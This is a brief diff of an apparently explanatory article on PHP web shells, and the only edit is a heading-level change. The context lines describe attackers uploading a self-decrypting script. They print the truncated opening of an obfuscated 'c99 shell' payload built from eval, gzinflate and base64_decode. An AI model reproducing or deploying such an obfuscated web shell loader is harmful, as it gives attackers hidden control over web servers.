@@ -19,7 +19,7 @@ The script is then uploaded by a potential attacker, and the server decrypts and
 
 This is what an encrypted c99 shell script looks like:
 
-## C99 Shell (encrypted) source code
+### C99 Shell (encrypted) source code
 
 <pre class="brush: php; title: ; notranslate" title="">&lt;? eval(gzinflate(base64_decode('FJ3HjuvKkkV/pWd9AQ7oHfDwLuiN6K3ISYOe
 ovfu65s1q4NTUlVmRsRei0VJ//73P//+T3Ek3T/V8xvKLtmKf9JkLQjs//IiG/Pin/8VV
